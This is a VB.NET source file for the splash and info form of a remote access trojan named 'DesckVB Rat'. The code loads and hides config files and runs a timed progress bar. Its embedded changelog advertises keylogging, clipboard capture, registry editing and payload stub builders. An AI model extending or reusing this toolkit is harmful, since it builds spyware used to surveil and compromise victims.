Imports System.IO
Imports System.Text
Imports System.Windows.Forms
Imports System.Diagnostics
Imports System.ComponentModel
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.ApplicationServices
Imports Microsoft.VisualBasic
Imports System
Imports System.Windows.Forms.TextBox
Imports System.Windows.Forms.MessageBox 'para manter todas as messagebox em superior ou forme na hora de ser exebidas
Imports System.Windows.Forms.PictureBox
Imports System.Windows.Forms.Button
Imports System.Windows.Forms.CheckBox


'infor rat v6
'Coded By pjoao1578
Public Class Info
#Region "ondem"
    Dim teste = """" 'aspas
    Dim hiden As FileAttribute = FileAttribute.Hidden + FileAttribute.System + FileAttributes.ReadOnly + FileAttributes.Directory 'hide + system
    Dim normal As FileAttribute = FileAttribute.Normal 'normal
#End Region

    Private Sub Info_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Try

        Catch ex As Exception
            Me.ShowIcon = False
            Me.ShowInTaskbar = False 'Taskbar = false
            Me.Visible = False ' hide forme
            Me.Hide()  'hide forme
            ProjectData.SetProjectError(ex)
            ProjectData.EndApp()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Info_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try

        Catch ex As Exception
            Me.ShowIcon = False
            Me.ShowInTaskbar = False 'Taskbar = false
            Me.Visible = False ' hide forme
            Me.Hide()  'hide forme
            ProjectData.SetProjectError(ex)
            ProjectData.EndApp()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Info_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try 'creat past & configs
            'verificar se a pasta configs existe caso nao exista criala
            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/Configs") And My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/Voice") Then
                '1 verificar se a pasta configs existe caso nao exista criala
            Else
                '2 criar a pasta configs caso nao exista
                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "/Configs")
            End If
            'verificar se confis.txt existem caso nao exista criar os configs
            If IO.File.Exists(Application.StartupPath & "/Configs/config.txt") Then 'criar os config
                '1 criar os config.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "true"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config1.txt") Then 'criar os config
                '1 criar os config1.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "false"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config1.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config2.txt") Then 'criar os config
                '1 criar os config2.txt caso nao exista
            Else
                '2 se existe escrever em texto true
                Dim texto As String = "true"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config2.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config3.txt") Then 'criar os config
                '1 criar os config3.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = Form1.NumericUpDown1.Value
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config3.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config4.txt") Then 'criar os config
                '1 criar os config4.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "True"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config4.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            Try
                File.SetAttributes(Application.StartupPath & "/Configs/config5.txt", normal) 'normal
            Catch ex As Exception
            End Try
            If IO.File.Exists(Application.StartupPath & "/Configs/config5.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "false"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config5.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config6.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "false"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config6.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config7.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "false"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config7.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config8.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = "true"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config8.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config9.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = 100
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config9.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            If IO.File.Exists(Application.StartupPath & "/Configs/config10.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
            Else
                '2 se existe escrever em texto true 
                Dim texto As String = 1
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config10.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
            End If
            'caregar config para da true ou false nas configuraçoes
            If IO.File.Exists(Application.StartupPath & "/Configs/config.txt") Then
                opções.CheckBox1.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config.txt")
            End If
            'caregar config para da true ou false nas configuraçoes
            If IO.File.Exists(Application.StartupPath & "/Configs/config1.txt") Then
                opções.CheckBox2.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config1.txt")
            End If
            'caregar config para da true ou false nas configuraçoes
            If IO.File.Exists(Application.StartupPath & "/Configs/config2.txt") Then
                opções.CheckBox3.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config2.txt")
            End If
            'salvar porta de conexoes
            If IO.File.Exists(Application.StartupPath & "/Configs/config3.txt") Then
                Form1.NumericUpDown1.Value = IO.File.ReadAllText(Application.StartupPath & "/Configs/config3.txt")
            End If
            'caregar config para da true ou false nas configuraçoes 
            If IO.File.Exists(Application.StartupPath & "/Configs/config4.txt") Then
                opções.CheckBox4.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config4.txt")
            End If
            'caregar config para da true ou false nas configuraçoes
            If IO.File.Exists(Application.StartupPath & "/Configs/config5.txt") Then
                IO.File.SetAttributes(Application.StartupPath & "/Configs/config5.txt", normal)
                Me.CheckBox1.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config5.txt") 'caregar config 5 / CheckBox1.Checked do infor
                opções.CheckBox5.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config5.txt")
            End If
            'caregar config para da true ou false nas configuraçoes
            If IO.File.Exists(Application.StartupPath & "/Configs/config6.txt") Then
                opções.CheckBox6.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config6.txt")
            End If
            'caregar config para da true ou false nas configuraçoes
            If IO.File.Exists(Application.StartupPath & "/Configs/config7.txt") Then
                opções.CheckBox7.Checked = IO.File.ReadAllText(Application.StartupPath & "/Configs/config7.txt")
            End If
            'caregar config para da true ou false nas configuraçoes 
            If IO.File.Exists(Application.StartupPath & "/Configs/config9.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
                opções.ComboBox2.Text = IO.File.ReadAllText(Application.StartupPath & "/Configs/config9.txt")
            End If
            'caregar config para da true ou false nas configuraçoes 
            If IO.File.Exists(Application.StartupPath & "/Configs/config10.txt") Then 'criar os config
                '1 criar os config5.txt caso nao exista
                opções.ComboBox1.Text = IO.File.ReadAllText(Application.StartupPath & "/Configs/config10.txt")
            End If
            IO.File.SetAttributes(Application.StartupPath & "/Configs/config5.txt", hiden)
            'texto excrito em TextBox1 no infor
            Me.TextBox1.Text =
"///[DesckVB Rat Bleck Private Edition Ver 2.6]///" & vbNewLine & _
"Coded By Njq8" & vbNewLine & _
"Coded By pjoao1578" & vbNewLine & _
"Coded By Vulkano" & vbNewLine & _
"Coded By Carlos DF" & vbNewLine & _
"Coded By Osamacoder" & vbNewLine & _
"Coded By Umprella-win7" & vbNewLine & _
"Coded Strings Rondom By Fud Mario e Pjoao1578" & vbNewLine & _
"" & vbNewLine & _
"Atualizado 5/06/2015" & vbNewLine & _
"{Atenção !! --> [Não me responsabilizo por mal uso desta ferramenta ou pelos seus atos !!]}" & vbNewLine & _
"{atención !! --> [Yo no soy responsable por el mal uso de la herramienta o de sus actos !!]}" & _
"{Attention !! --> [I'm not responsible for misuse of the tool or its acts !!]}" & _
"[Skype = pjoao1578]" & vbNewLine & _
"Nesta v2.6 foi colocado o regedit o get clickbord send emails e report erros do projeto" & vbNewLine & _
"os erros que avia foi corigidos foi melhorado a conexão do server com o cliente" & vbNewLine & _
"foi colocado mais opções no creat server foi colocado o creat server downloadfile" & vbNewLine & _
"o keylogger foi totalmente remudelado o regedit foi melhorado as interfases tambem foi remudelada" & vbNewLine & _
"o not report erros do cliente e stub foi melhorado" & vbNewLine & _
"tambem foi melhorado icones imagems codigos interfase foi colocado os logs" & vbNewLine & _
"Stub normal e stub downloadfile foi melhoras tanto os codigos como erros corigidos foi compilado stubs e cliente em Visual Studio 2013" & vbNewLine & _
"{Ajude a melhorar o DesckVB Rat repotando erros que ajá nele pelo report erros ou skype :) }"
            Me.Button1.Enabled = False 'cancelar Button1
            Me.CheckBox1.Enabled = False 'cancelar CheckBox1
            Me.Timer1.Start() 'start contador de 1 a 10 a 2000 sleep = a 2 segundo  por contagem
        Catch ex As Exception 'erro nao report
            MessageBox.Show("Erro", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'mensagem
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick 'interval 2000
        Me.Label1.Text = "        0"
        Me.ToolStripProgressBar1.Value = 3 '%
        Me.Timer2.Start()
        Me.Timer1.Stop()
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick 'interval 2000
        Me.Label1.Text = "        1"
        Me.ToolStripProgressBar1.Value = 5 '%
        Me.Timer3.Start()
        Me.Timer2.Stop()
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick 'interval 2000
        Me.Label1.Text = "        2"
        Me.ToolStripProgressBar1.Value = 10 '%
        Me.Timer4.Start()
        Me.Timer3.Stop()
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick 'interval 2000
        Me.Label1.Text = "        3"
        Me.ToolStripProgressBar1.Value = 20 '%
        Me.Timer5.Start()
        Me.Timer4.Stop()
    End Sub

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick 'interval 2000
        Me.Label1.Text = "        4"
        Me.ToolStripProgressBar1.Value = 30 '%
        Me.Timer6.Start()
        Me.Timer5.Stop()
    End Sub

    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick 'interval 2000
        Me.Label1.Text = "        5"
        Me.ToolStripProgressBar1.Value = 40 '%
        Me.Timer7.Start()
        Me.Timer6.Stop()
    End Sub

    Private Sub Timer7_Tick(sender As Object, e As EventArgs) Handles Timer7.Tick 'interval 2000
        Me.Label1.Text = "        6"
        Me.ToolStripProgressBar1.Value = 50 '%
        Me.Timer8.Start()
        Me.Timer7.Stop()
    End Sub

    Private Sub Timer8_Tick(sender As Object, e As EventArgs) Handles Timer8.Tick 'interval 2000
        Me.Label1.Text = "        7"
        Me.ToolStripProgressBar1.Value = 60 '%
        Me.Timer9.Start()
        Me.Timer8.Stop()
    End Sub

    Private Sub Timer9_Tick(sender As Object, e As EventArgs) Handles Timer9.Tick 'interval 2000
        Me.Label1.Text = "        8"
        Me.ToolStripProgressBar1.Value = 70 '%
        Me.Timer10.Start()
        Me.Timer9.Stop()
    End Sub

    Private Sub Timer10_Tick(sender As Object, e As EventArgs) Handles Timer10.Tick 'interval 2000
        Me.Label1.Text = "        9"
        Me.ToolStripProgressBar1.Value = 80 '%
        Me.Timer11.Start()
        Me.Timer10.Stop()
    End Sub

    Private Sub Timer11_Tick(sender As Object, e As EventArgs) Handles Timer11.Tick 'interval 2000
        Me.Label1.Text = "        10"
        Me.ToolStripProgressBar1.Value = 90 '%
        Me.Timer12.Start()
        Me.Timer11.Stop()
    End Sub

    Private Sub Timer12_Tick(sender As Object, e As EventArgs) Handles Timer12.Tick 'interval 2000
        Me.ToolStripProgressBar1.Value = 100 '%
        Me.Label1.Enabled = False
        Me.Label1.Visible = False
        Me.Button1.Enabled = True
        Me.CheckBox1.Enabled = True
        Me.Button1.Text = "Abra o rat?"
        Me.ToolStripProgressBar1.Value = 0 'clea ProgressBar
        Me.Timer12.Stop()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.ShowIcon = False
        Me.ShowInTaskbar = False 'Taskbar = false
        Me.Visible = False ' hide forme
        Me.Hide()  'hide forme
        Form1.Show() 'abri rat
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        Try
            If CheckBox1.Checked = True Then
                File.SetAttributes(Application.StartupPath & "/Configs/config5.txt", FileAttributes.Normal)
                Dim texto As String = "True"
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config5.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
                Me.ShowIcon = False
                Me.ShowInTaskbar = False 'Taskbar = false
                Me.Visible = False ' hide forme
                Me.Hide()  'hide forme
                Form1.Show() 'abri rat
                opções.CheckBox5.Checked = True
            Else
                Dim texto As String = "False" 'da false
                Dim esc_texto As New StreamWriter(Application.StartupPath & "/Configs/config5.txt")
                esc_texto.Write(texto)
                esc_texto.Close()
                opções.CheckBox5.Checked = False
            End If
        Catch ex As Exception 'erro nao report
        End Try
    End Sub

    Private Sub CopyAllTXTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyAllTXTToolStripMenuItem.Click
        Me.TextBox1.SelectAll() 'Select txt
        Try
            My.Computer.Clipboard.SetText(Me.TextBox1.Text) 'copy txt all
        Catch ex As Exception 'erro nao report
        End Try
        MessageBox.Show("TXT Copiado", "Copiado !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub SelectCopyTXTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SelectCopyTXTToolStripMenuItem.Click
        Try
            My.Computer.Clipboard.SetText(Me.TextBox1.SelectedText) 'copy txt selected
        Catch ex As Exception 'erro nao report
        End Try
        MessageBox.Show("TXT Copiado", "Copiado !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Me.TextBox1.Clear() 'linpar txt
            ProjectData.EndApp() 'fechar = finalizar tudo
        Catch ex As Exception 'erro nao report
            ProjectData.SetProjectError(ex) 'not report erros
            ProjectData.EndApp()
            ProjectData.ClearProjectError() 'not report erros
        End Try
    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        Try
            Me.TextBox1.Clear() 'linpar txt
            ProjectData.EndApp() 'fechar = finalizar tudo
        Catch ex As Exception 'erro nao report
            ProjectData.SetProjectError(ex) 'not report erros
            ProjectData.EndApp()
            ProjectData.ClearProjectError() 'not report erros
        End Try
    End Sub

    Private Sub Info_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Try
            Me.TextBox1.Clear() 'linpar txt
            ProjectData.EndApp() 'fechar = finalizar tudo
        Catch ex As Exception 'erro nao report
            ProjectData.SetProjectError(ex) 'not report erros
            ProjectData.EndApp()
            ProjectData.ClearProjectError() 'not report erros
        End Try
    End Sub

    Private Sub Info_Closed(sender As Object, e As EventArgs) Handles Me.Closed
        Try
            Me.TextBox1.Clear() 'linpar txt
            ProjectData.EndApp() 'fechar = finalizar tudo
        Catch ex As Exception 'erro nao report
            ProjectData.SetProjectError(ex) 'not report erros
            ProjectData.EndApp()
            ProjectData.ClearProjectError() 'not report erros
        End Try
    End Sub
End Class